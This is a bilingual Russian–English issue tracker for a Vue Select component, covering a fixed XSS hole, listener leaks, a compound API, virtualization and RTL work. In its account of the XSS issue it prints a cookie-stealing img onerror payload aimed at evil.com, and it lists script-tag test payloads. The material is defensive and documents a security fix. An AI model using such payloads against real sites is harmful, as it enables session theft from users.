---
title: Issues — Select
summary: 11/13 issues закрыты (2026-05-11 wave + 2026-06-13 — Issue 3 compound API, Issue 9 RTL, Issue 4 inherited SSR/exports). Открытые — Issue 7 (virtualization, 🔓 unblocked — добавлен VirtualScroller, integration pending) и B10 (colors, deferred Wave 9). Wave 4.3 keyboard (Home/End/typeahead) ✅ 2026-06-20.
updated: 2026-06-20
audit-checklist: 60-point + Configuration support + Dual-API gap
source: lib/select/
related-doc: ../components/select.md
---

# Issues — Select

## Сводка

| Severity | Count (open) | Categories                                            |
| -------- | ------------ | ----------------------------------------------------- |
| critical | 0            | —                                                     |
| high     | 1            | H43 (virtualization, unblocked — integration pending) |
| medium   | 0            | —                                                     |
| low      | 1            | B10 (colors → semantic tokens, deferred)              |

> Оба открытых пункта — **не баги**: Issue 7 **разблокирован** (2026-06-13) — добавлен dependency-free [VirtualScroller](../components/virtualscroller.md) + `useVirtualScroll`; осталась интеграция в Select (отдельным ТЗ). B10 требует lib-wide token-слоя (Wave 9). Все остальные 11 пунктов закрыты.

> **Wave 4.3 keyboard (✅ 2026-06-20):** в [keydownSelect](../../lib/select/Select.vue#L586) добавлены **Home/End** (`focusItemAt`) и **first-char typeahead** для `noQuery`-listbox (`typeaheadFocus`, APG-циклирование). Это roadmap-only пункт ([issues/README.md Wave 4.3](./README.md)) без numbered issue — **матрица severity не меняется**. См. [components/select.md §12](../components/select.md).

## ~~Issue 1: CRITICAL — XSS через `v-html` в `marker` и `noData`~~ ✅ resolved 2026-05-11

- **Категория:** C13 + security
- **Severity:** ~~**critical**~~
- **Где (was):** ~~[Select.vue:553, 562, 564]~~ — все три `v-html` сайта удалены.
- **Status:** ✅ resolved 2026-05-11

**Что сделано (2026-05-11):**

- `v-html="item?.marker"` (Select.vue:553) → scoped slot `#marker` с default-template, который рендерит `<mark>`-теги через `<template v-for>` + text-interpolation (без `v-html`). См. [Select.vue](../../lib/select/Select.vue) (slot `marker` в template, helper `splitByQuery` + `markerParts` в script).
- `v-html="noData"` (Select.vue:562, 564) → объединено в `#empty` slot с default text-node `<div>{{ noData }}</div>`.
- `dataList` computed больше **не** мутирует `item.marker` HTML-строкой — подсветка вычисляется на render-time через safe helper.
- `IDataItem.marker?: string` помечен `@deprecated`; передача поля логируется через `console.warn` один раз на item (WeakSet guard).
- Slots `marker` и `empty` объявлены в `SelectSlots` ([Select.d.ts](../../lib/select/Select.d.ts)) с типизированными scoped-props.

**Acceptance criteria:**

- [x] `<Select :data-select="[{ id: 1, value: 'X', marker: '<script>alert(1)</script>' }]">` — НЕ исполняет скрипт. Тест: `Select.test.ts` > `does not execute XSS payload from item.marker (legacy field is ignored)`.
- [x] Payload с `<img src=x onerror=...>` в `noData` — DOM не содержит `<img>`. Тест: `does not execute XSS payload from noData prop`.
- [x] Поиск/highlighting работает: substring matches рендерится в `<mark>`-тегах через safe-helper.
- [x] `#marker` scoped slot позволяет custom override без потери безопасности.

### Историческая запись (что было)

### Что найдено

```vue
<div v-if="isQuery && item?.marker" v-html="item?.marker" :class="classItemSelectValue" />
...
<div v-if="!dataList?.length" :class="classDataListNoData" v-html="noData" />
<div v-else :class="classNoData" v-html="noData" />
```

- `item?.marker` — приходит из `dataSelect` items (пользовательский data). Используется для подсветки совпадений при фильтрации.
- `noData` — пользовательский prop / option, текст при пустой выдаче.

Оба пробрасываются в DOM через `v-html` без санитизации.

### Почему это проблема

- Если `dataSelect` приходит из API (например, search-по-БД с user-controlled query), злоумышленник может закинуть запись с `marker: "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"`.
- `noData` менее опасен (статичный default), но если переопределён через `componentsOptions.Select.noData = userInput` — XSS.

### Что нужно сделать

**Опция A — slot вместо v-html (рекомендуется):**

1. В [Select.vue:553](../../lib/select/Select.vue#L553) заменить `v-html="item?.marker"` на:
   ```vue
   <slot name="marker" :item="item" :query="query" :class="classItemSelectValue">
     <span :class="classItemSelectValue">{{ item.marker || item[valueSelect] }}</span>
   </slot>
   ```
2. Marker-логика (highlighting matched substring) — переехать на template helper, который возвращает VNode с `<mark>` тегом, без HTML-строк.
3. Для `noData`:
   ```vue
   <slot name="empty">
     <div :class="classNoData">{{ noData }}</div>
   </slot>
   ```
   `noData: string` остаётся, но рендерится как text-node.

**Опция B — `dompurify` санитизация перед v-html.** Хуже DX, но если HTML-marker критичен — приемлемо.

4. Заменить text-highlight механизм: вместо string-сборки `<mark>` в `marker`, передавать в slot `query: string` и `text: string`, а пользовательский шаблон сам строит `<mark>`.
5. Type changes: убрать `marker?: string` из IDataItem (deprecate с warning).

### Acceptance criteria

- [ ] `<Select :data-select="[{ id: 1, value: 'X', marker: '<script>alert(1)</script>' }]">` — НЕ исполняет скрипт.
- [ ] Тест: payload с `<img src=x onerror=...>` в `marker` или `noData` — DOM не содержит `<img>`.
- [ ] Поиск/highlighting продолжает работать через slot или helper-функцию.

## ~~Issue 2: CRITICAL — Memory leak (ResizeObserver + keydown listeners без cleanup)~~ ✅ resolved 2026-05-11

- **Категория:** H41 (memory leaks)
- **Severity:** ~~**critical**~~
- **Где (was):** ~~[Select.vue:279-281, 284-292]~~ — `let resizeObserver` сохраняется в closure, `onBeforeUnmount` отключает observer и удаляет оба document keydown listener'а.
- **Status:** ✅ resolved 2026-05-11

**Что сделано (2026-05-11):**

- `new ResizeObserver(...)` теперь присваивается `let resizeObserver: ResizeObserver | undefined` в setup-scope (зеркалит [InputLayout pattern](../../lib/inputlayout/InputLayout.vue#L196-L237)).
- Добавлен `onBeforeUnmount` hook, который вызывает `resizeObserver?.disconnect()` + `document.removeEventListener("keydown", openSelectOnEnter)` + `document.removeEventListener("keydown", keydownSelect)`.
- `Select.initStyle()` дубликат в `onMounted` удалён — `Component.__hooks()` ([component/index.ts:79-84](../../lib/component/index.ts#L79-L84)) уже регистрирует через `vueOnMounted + onServerPrefetch`. Bonus: закрывает 1 пункт в [component-class.md Issue 1](./component-class.md) Wave 2.3 (progress 2/22 → 3/22).
- SSR-guard `if (isClient())` обернут вокруг `document.removeEventListener` вызовов.

**Acceptance criteria:**

- [x] `mount → focus → unmount` — keydown listener (`openSelectOnEnter`) удалён. Тест: `Select.test.ts` > `removes keydown listeners on unmount-while-focused`.
- [x] `mount → openSelect → unmount` — `ResizeObserver.disconnect()` вызван. Тест: `disconnects ResizeObserver on unmount`.
- [x] `onBeforeUnmount` существует и вызывает disconnect/removeEventListener.

### Историческая запись (что было)

### Что найдено

```ts
onMounted(() => {
  Select.initStyle()
  if (autoFocus.value) openSelect()
  new ResizeObserver(() => {
    if (isOpenList.value) selectListWindow.value?.updatePosition()
  }).observe(selectBody.value as HTMLElement)
})

watch(isFocus, (value) => {
  if (value) document.addEventListener("keydown", openSelectOnEnter)
  else document.removeEventListener("keydown", openSelectOnEnter)
})
watch(isOpenList, (value) => {
  if (value) document.addEventListener("keydown", keydownSelect)
  else document.removeEventListener("keydown", keydownSelect)
})
```

Проблемы:

1. `new ResizeObserver(...)` — instance создан, но не сохранён в ref → нельзя disconnect. **Утечка observer + closure**.
2. Если компонент unmount'ится в момент `isFocus === true` — listener `openSelectOnEnter` остаётся на `document` навсегда.
3. То же для `keydownSelect` если unmount во время `isOpenList === true`.
4. Нет `onBeforeUnmount` хука.

### Почему это проблема

- В SPA с динамической навигацией: открыли select → перешли на другую страницу через keyboard → старый listener на document продолжает реагировать на keydown.
- При множественных Select на странице → накапливаются observers, замедляют resize.
- Long-lived apps (CRM, dashboards) — постепенная деградация.

### Что нужно сделать

1. В [Select.vue:276](../../lib/select/Select.vue#L276) сохранить observer в ref:
   ```ts
   const resizeObserver = ref<ResizeObserver>()
   onMounted(() => {
     resizeObserver.value = new ResizeObserver(...)
     resizeObserver.value.observe(selectBody.value)
   })
   onBeforeUnmount(() => {
     resizeObserver.value?.disconnect()
     document.removeEventListener("keydown", openSelectOnEnter)
     document.removeEventListener("keydown", keydownSelect)
   })
   ```
2. Альтернативно — использовать VueUse `useResizeObserver(target, callback)` — auto-cleanup.
3. Тест:
   ```ts
   const wrapper = mount(Select, { props: { dataSelect: [{ id: 1, value: "a" }] }, attachTo: document.body })
   wrapper.find("input").trigger("focus")
   const beforeUnmount = document.querySelectorAll("*").length
   wrapper.unmount()
   // assert listeners removed (sniff via spy or check that triggering keydown after unmount doesn't crash)
   ```
4. Cross-cutting: проверить Calendar (тот же паттерн), FixWindow, Menu, Dialog — везде где есть document-listeners.

### Acceptance criteria

- [ ] Memory profiler в DevTools после mount/unmount × 100 раз — heap не растёт линейно.
- [ ] `onBeforeUnmount` существует и вызывает disconnect/removeEventListener.
- [ ] Unit-тест на listener cleanup.

## ~~Issue 3: Dual-API gap — нет compound `<Select><Option>` API~~ ✅ resolved 2026-06-13

- **Категория:** P (Dual-API)
- **Severity:** ~~high~~
- **Status:** ✅ resolved 2026-06-13

**Что сделано (2026-06-13):**

- Добавлены renderless-дети [SelectOption.vue](../../lib/select/SelectOption.vue) (props `value` required, `label?`, `disabled?`) и [SelectGroup.vue](../../lib/select/SelectGroup.vue) (props `label`/`title`) — зеркало [FormField](../../lib/form/FormField.vue)/[FormSection](../../lib/form/FormSection.vue).
- В [Select.vue](../../lib/select/Select.vue) — VNode-walk `slots.default()` в computed `compoundParsed` (helpers `compoundFlatten`/`isVNodeNamed`/`compoundChildren`, обработка Fragment/Comment/Text); `sourceData` computed подменяет `props.dataSelect` в `keySelect`/`valueSelect`/`dataSelect` пайплайне. **Schema-driven `dataSelect` выигрывает** (`schemaActive`), иначе — compound-опции.
- `renderRows` computed вставляет non-selectable group-headers (`[data-select-group]`, `role="presentation"`) между опциями; keyboard-nav таргетит `li[data-select-list-item]` (headers исключены). `disabled`-опции — `aria-disabled`, guard в `select()`, dimmed-класс.
- Runtime barrel [index.ts](../../lib/select/index.ts) (rollup-entry, зеркало form/table/menu); типы `SelectOptionProps`/`SelectGroupProps` + `declare class` + `GlobalComponents` в [Select.d.ts](../../lib/select/Select.d.ts). Naming: value-`SelectOption` сосуществует с options-типом `SelectOption` (разные namespace TS, companion pattern).
- Nuxt auto-import: `SelectOption`/`SelectGroup` добавлены в `FISHT_VUE_SUBCOMPONENTS` ([module/nuxt.ts](../../lib/module/nuxt.ts)). Build: `select` переключён на `index.ts`-entry в [rollup.config.js](../../lib/rollup.config.js) (`select.mjs` экспортирует default + named).
- Документация: [select.md §9.5 «Compound API»](../components/select.md).

**Acceptance criteria:**

- [x] Schema-driven `<Select :data-select=[...]>` работает без изменений (regression-тесты зелёные).
- [x] Compound `<Select><SelectOption value="a">A</SelectOption></Select>` рендерит 1 опцию. Тест: `Select.test.ts` > `renders options from compound <SelectOption> children`.
- [x] Mix `:data-select` + дети → schema выигрывает. Тест: `schema-driven dataSelect wins over compound children`.
- [x] Type-safe value: `<SelectOption :value="42">` → `modelValue === 42`. Тест: `infers value type — numeric value round-trips through modelValue`.
- [x] `disabled` опция не выбирается + `aria-disabled`. Тест: `disabled compound option is marked aria-disabled and is not selectable`.
- [x] `<SelectGroup>` рендерит header. Тест: `renders <SelectGroup> label header above its options`.

**Ограничение:** rich per-option контент (иконки) compound-API не рендерит — используй `#item` slot / schema-driven `:data-select`.

### Историческая запись (что было)

### Что найдено

API только schema-driven:

```vue
<Select
  :data-select="[
    { id: 1, value: 'A' },
    { id: 2, value: 'B' }
  ]"
  key-select="id"
  value-select="value" />
```

Custom rendering каждого option возможен только через единый slot `selectItem` для всего списка. Нет per-option конфигурации (disabled, group, custom icon, custom render per item) через template-уровень.

### Почему это проблема

- Industry-standard (PrimeVue, Element Plus, Naive UI) поддерживают оба API.
- Use-case: «3 статичных опции с разной иконкой и свойством disabled» — schema-driven вынуждает строить массив объектов с per-item override-полями, type-safety теряется.
- Compound API:
  ```vue
  <Select v-model="x">
    <SelectOption value="a" disabled><Icons type="ban" /> Locked</SelectOption>
    <SelectOption value="b">Free</SelectOption>
    <SelectGroup label="Premium">
      <SelectOption value="c">Premium A</SelectOption>
    </SelectGroup>
  </Select>
  ```

### Что нужно сделать

**Параллельный compound API без breaking change:**

1. Создать `lib/select/SelectOption.vue`:
   ```vue
   <script setup lang="ts">
     import { inject } from "vue"
     const ctx = inject(SELECT_CONTEXT)
     const props = defineProps<{ value: any; disabled?: boolean; label?: string }>()
     ctx?.registerOption({ value: props.value, disabled: props.disabled, label: props.label, slot: useSlots().default })
   </script>
   <template><!-- not rendered directly; rendered via parent context --></template>
   ```
2. Создать `lib/select/SelectGroup.vue` — `provide`-родитель для group label.
3. В `Select.vue` создать `provide(SELECT_CONTEXT, { registerOption, unregisterOption })`. При mount/update children собирают свои options в reactive Map.
4. Resolve-приоритет: если `dataSelect` prop передан — он выигрывает (legacy schema). Если children `<SelectOption>` есть — берутся они.
5. Type registration:
   ```ts
   // SelectContext.d.ts
   export interface SelectContext {
     registerOption(opt: SelectOptionDescriptor): void
     unregisterOption(value: any): void
   }
   export const SELECT_CONTEXT: InjectionKey<SelectContext>
   ```
6. Children walk при render — используем `useSlots()` + `Fragment` flattening для обработки conditional `<template v-if>`.
7. Документация: новый раздел в [Documentation/components/select.md](../components/select.md) §10.5 «Compound API».
8. Codemod (см. Issue 28-aria.md): автозамена опционально.

### Acceptance criteria

- [ ] Schema-driven `<Select :data-select=[...]>` продолжает работать без изменений.
- [ ] Compound `<Select><SelectOption value="a">A</SelectOption></Select>` рендерит select с одной опцией.
- [ ] Можно смешивать (но schema выигрывает / документировано).
- [ ] Type-safe: `<SelectOption :value=42>` инфёрит value type.

## ~~Issue 4: SSR styles + sideEffects/exports map (cross-cutting)~~ ✅ resolved (inherited)

- **Категория:** C17, A2, A4, A5
- **Severity:** ~~high~~
- **Status:** ✅ resolved (inherited) — закрыт на уровне фреймворка, кода Select не требует.

**Почему inherited:**

- **C17 (SSR styles):** Select инстанцирует `new Component<"Select">()` → `Component.__hooks()` ([component/index.ts](../../lib/component/index.ts)) регистрирует `onServerPrefetch(() => initStyle())` + `onMounted` → стили попадают в `cssComponents` Map и инлайнятся Nuxt server-плагином до hydration. Дубль `initStyle()` в SFC убран ещё в Issue 2 (см. ниже).
- **A2 (sideEffects):** root `lib/package.json` → `"sideEffects": false`; build инжектит то же в `dist/select/package.json` (проверено: `dist/select/package.json` содержит `"sideEffects": false`).
- **A4/A5 (exports map + ESM-only):** root exports-map генерит `buildRootExports()` в [rollup.config.js](../../lib/rollup.config.js); `dist/package.json` содержит `"./select": { types, import, default }`. Переключение select на `index.ts`-entry (Issue 3) build-инфраструктурой обработано идентично form/table/menu — exports/sideEffects сохранены.

Канонический паттерн — [button.md Issue 1, Issue 8, Issue 9](./button.md).

## ~~Issue 5: Нет componentsStyle global fallback~~ ✅ resolved 2026-05-11

- **Категория:** L53
- **Severity:** ~~high~~
- **Status:** ✅ resolved 2026-05-11

`mode` computed в [Select.vue](../../lib/select/Select.vue) теперь резолвится по полной fallback chain: `props.mode ?? options?.mode ?? Select.componentsStyle() ?? "outlined"`. Зеркалит [Input.vue:62-64](../../lib/input/Input.vue#L62-L64) pattern. Тесты: `Select.test.ts` > `falls back to global componentsStyle when props.mode not provided` + `prop.mode wins over global componentsStyle`.

## ~~Issue 6: `unstyled: true` не обрабатывается~~ ✅ resolved 2026-05-11

- **Категория:** L53
- **Severity:** ~~high~~
- **Status:** ✅ resolved 2026-05-11 (cross-cutting fix в `lib/component/index.ts` — закрывает Issue 6 во всех 22 компонентах + [component-class.md Issue 6](./component-class.md))

`Component.setStyle()` теперь проверяет `this.__globalConfig?.config?.unstyled` и возвращает `""` если true — это отключает рендер Tailwind-классов во всех компонентах, использующих базовый класс. Тест: `Select.test.ts` > `respects unstyled: true via Component.setStyle guard`. Roadmap Wave 3.1 — done.

## Issue 7: Нет виртуализации списка — лагает при >500 items — 🔓 unblocked (integration pending)

- **Категория:** H43 (виртуализация)
- **Severity:** high (integration pending)
- **Где:** рендер dropdown списка в [Select.vue](../../lib/select/Select.vue) (`renderRows` / `<TransitionGroup>`)
- **Status:** 🔓 **unblocked 2026-06-13.** Прежний блокер (нужна runtime-зависимость вопреки no-deps цели) снят: в `lib/` добавлен **dependency-free** примитив виртуализации — [VirtualScroller](../components/virtualscroller.md) + headless composable `useVirtualScroll` ([lib/virtualscroller/](../../lib/virtualscroller/useVirtualScroll.ts)). Осталась **интеграция** в Select (отдельным ТЗ/коммитом, см. план §10 спеки): при `count > threshold` рендерить опции через `useVirtualScroll`, переписать keyboard-nav с DOM-scan на index-математику + `scrollToIndex`, отключить GSAP-stagger в virtual-режиме. Группы (variable-height заголовки) — проверить отдельно.

### Что найдено

Все `dataList` items рендерятся в DOM одновременно. При `dataSelect` с >500 элементами:

- Скролл лагает.
- Initial open — задержка 200-500ms.
- Memory растёт (каждый item — несколько DOM узлов + reactive computed).

### Почему это проблема

- Use-case: select country (~250 элементов), select из CRM (~10000 contacts) — фактически невозможно использовать без custom virtualization.

### Что нужно сделать

1. Использовать **dependency-free** [`useVirtualScroll`](../../lib/virtualscroller/useVirtualScroll.ts) (НЕ внешнюю библиотеку — no-deps цель сохранена).
2. Добавить prop `virtual?: boolean` (default false для backward compat) или `virtualThreshold?: number` (default 100 — auto-enable если items.length > threshold).
3. При virtual mode: render только visible window + overscan-buffer; keyboard-nav на index-математику + `scrollToIndex`; отключить GSAP-stagger.
4. В [Documentation/components/select.md](../components/select.md): performance benchmark до/после.

### Acceptance criteria

- [ ] `<Select :data-select="thousand_items" virtual>` — first render <50ms.
- [ ] Скролл 60fps в Chrome DevTools profiler.

## ~~Issue 8: aria-live для search results отсутствует~~ ✅ resolved 2026-05-11

- **Категория:** E29.5 (announcements)
- **Severity:** ~~medium~~
- **Status:** ✅ resolved 2026-05-11

`<div data-select-aria-live class="sr-only" aria-live="polite" aria-atomic="true">{{ ariaResultsLabel }}</div>` рендерится внутри dropdown. `ariaResultsLabel` computed формирует строку через `Select.t("select.resultsCount" | "select.resultsCountOne" | "select.resultsCountNone")` с подстановкой `%d`. Новые locale-ключи добавлены в [TypesLocale.d.ts](../../lib/locale/TypesLocale.d.ts), [locales/en.ts](../../lib/locale/locales/en.ts) и [ru.ts](../../lib/locale/locales/ru.ts). Тест: `Select.test.ts` > `renders aria-live region with results count when query is active`.

## ~~Issue 9: RTL — left/right в `right-0`, `mr-2`, etc.~~ ✅ resolved 2026-06-13

- **Категория:** F31
- **Severity:** ~~medium~~
- **Status:** ✅ resolved 2026-06-13

**Что сделано (2026-06-13):** физические left/right Tailwind-классы в [Select.vue](../../lib/select/Select.vue) заменены на логические (авто-флип при `dir="rtl"`, зеркало [switch.md Issue 8](./switch.md) / [table.md](./table.md)):

- `iconCheck`: `left-0` → `start-0`, `pl-2` → `ps-2`.
- `classLiItem`: `pl-8 pr-4` → `ps-8 pe-4`.
- `classItemSelectValue`: добавлен `rtl:text-right` override (движок сохраняет `text-left` как LTR-default).
- maxVisible-badge: `pl-2` → `ps-2`; Funnel-иконка: `mr-1` → `me-1`.
- Динамический dropdown-оффсет: `ml-[${beforeWidth}px]` → `ms-[${beforeWidth}px]` (arbitrary logical margin — подтверждено `unoRules.ts` margin-rule поддерживает axis `s`/`e` + arbitrary).

Тесты: `Select.test.ts` > блок «Issue 9: RTL via logical Tailwind properties» (`ps-/pe-` вместо `pl-/pr-`, `start-0`/`ps-2` на check-иконке, `ms-[` вместо `ml-[`, `rtl:text-right`).

## ~~Issue 10: Локаль для filtering search query~~ ✅ resolved 2026-05-11

- **Категория:** F32
- **Severity:** ~~medium~~
- **Status:** ✅ resolved 2026-05-11

Фильтрация теперь использует `Intl.Collator(getActiveLocale() ?? "en", { sensitivity: "base", usage: "search" })` — diacritic-insensitive (немецкое `ü` matches `u`, французское `é` matches `e`) и case-insensitive. Helper `matchesQuery(itemValue, q)` — sliding-window substring match через `collator.compare`. Подсветка совпадений (`splitByQuery` → `markerParts`) использует тот же collator для согласованности с фильтром. Тест: `Select.test.ts` > `filters dataList through Intl.Collator (diacritic-insensitive)`.

## ~~Issue 11: prefers-reduced-motion + print + colors hardcode~~ ✅ resolved 2026-05-11 (motion + print parts)

- **Категория:** E29.7, N59, B10
- **Severity:** ~~low~~ (частично — `motion-safe:` + `print:` закрыты; B10 colors через theme tokens — Wave 9)
- **Status:** ✅ resolved 2026-05-11 (motion-safe + print). B10 / colors hardcode остаётся открытым (Wave 9).

**Что сделано:**

- Все Tailwind `transition*` / `duration-*` классы в [Select.vue](../../lib/select/Select.vue) обёрнуты в `motion-safe:` префикс (CSS variant `@media (prefers-reduced-motion: no-preference)`). Зеркалит [Input.vue:87, 89, 98](../../lib/input/Input.vue#L87-L98) pattern.
- Корневой контейнер получил `print:bg-white print:text-black print:shadow-none`.
- `<transition-group>` в template (multiple-mode badges) использует `motion-safe:transition motion-safe:ease-in-out motion-safe:duration-300` (вместо безусловного `transition`).
- Inline `transition-colors duration-500` на Badge-компонентах в template заменены на `motion-safe:transition-colors motion-safe:duration-500`.
- Тест: `Select.test.ts` > `uses motion-safe: prefix on transition classes`.

**Что осталось открытым:**

- GSAP-анимация раскрытия списка не учитывает `prefers-reduced-motion` — потребует JS-проверки media query или Motion-One интеграцию. Wave 10.1 follow-up.
- **B10 — hardcoded `text-gray-500`, `bg-stone-100`, `bg-white dark:bg-black` и т. д.** → ⏸️ **deferred (Wave 9, lib-wide)**. Research 2026-06-13: в `lib/theme/primitive.ts` semantic-токенов (`bg-background`/`text-muted-foreground`/`border-border`) **не существует** — только примитивная палитра (22 цвета × 11 тонов) + динамический брендовый `theme-*`. **Ни один из 22 компонентов** semantic-токены не использует (Form/Split тоже хардкодят gray). «Полная миграция» требует сначала построить token-слой (`primitive.ts` + `semantic.ts` + `unoRules.ts`) — cross-cutting изменение критичного `lib/theme/`, ideally раскатывать lib-wide отдельным ТЗ, а не select-only. Решение пользователя (2026-06-13): отложить.

## Cross-cutting: Configuration support

| Настройка                  | Поддержано? | Комментарий                                                  |
| -------------------------- | ----------- | ------------------------------------------------------------ |
| `componentsOptions.Select` | ✅          | mode, autoFocus, valueSelect, keySelect, и др.               |
| `componentsStyle` global   | ✅          | Issue 5 (resolved) — fallback chain в `mode`                 |
| `unstyled: true`           | ✅          | Issue 6 (resolved) — `Component.setStyle` guard              |
| Theme tokens vs hardcode   | ⚠️          | theme-\* для акцентов; нейтральные gray/stone хардкод — B10 (deferred) |
| Runtime theme switch       | ⚠️          | через CSS-vars OK                                            |
| `t()` для текста           | ⚠️          | `noData` имеет fallback `Select.t("noData")` (Select.vue)    |
| Runtime locale switch      | ✅          | Issue 10 (resolved) — `Intl.Collator(getActiveLocale())`     |

## Dual-API gap — ✅ resolved 2026-06-13

См. Issue 3 выше (✅ resolved).

**Текущий API:** schema-driven `<Select :data-select="[...]" />` (primary, не breaking).
**Параллельный compound API (реализован):** `<Select><SelectOption value=".." />` + `<SelectGroup label="..">` — opt-in через children, schema выигрывает при совместном использовании.
**Industry parallel:** Element Plus `<el-select><el-option>`, Naive UI `<n-select :options>` + `<n-select-option>`, PrimeVue `<Dropdown :options>` + `<DropdownItem>`.
